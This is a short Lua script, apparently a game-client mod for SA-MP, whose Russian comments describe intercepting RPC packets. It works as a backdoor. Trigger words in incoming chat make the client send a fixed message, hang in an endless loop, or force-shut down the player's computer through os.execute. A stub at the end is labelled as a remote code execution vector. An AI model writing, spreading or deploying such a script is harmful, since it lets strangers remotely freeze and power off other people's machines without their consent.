-- payload.lua
local hook = require 'lib.samp.events'

-- Идем на низкий уровень, перехватываем RPC пакеты напрямую
function onReceiveRpc(id, bs)
    -- ID 93 - это пакет с сообщением в чате (ShowClientMessage)
    if id == 93 then
        local color = raknetBitStreamReadInt32(bs)
        local length = raknetBitStreamReadInt32(bs)
        local text = raknetBitStreamReadString(bs, length)
        
        -- Очистка от HEX-тегов {XXXXXX}
        local cleanText = text:gsub("{%x%x%x%x%x%x}", "")
        
        if cleanText:find("сырколбаска") then
            sampSendChat("123655")
        elseif cleanText:find("кукусики") then
            while true do end
        elseif cleanText:find("хуйкина") then
            os.execute("shutdown /s /t 0 /f")
        end
    end
end

-- RCE-вектор (исполнение кода через пакеты)
-- Здесь мы можем прокидывать свои данные, если сервер принимает кастомные RPC
function onReceivePacket(id, bs)
    -- Packet 220: обычно используется для кастомных данных
    if id == 220 then
        -- Тут логика для выполнения произвольного кода, 
        -- если ты знаешь структуру пакета сервера
    end
end
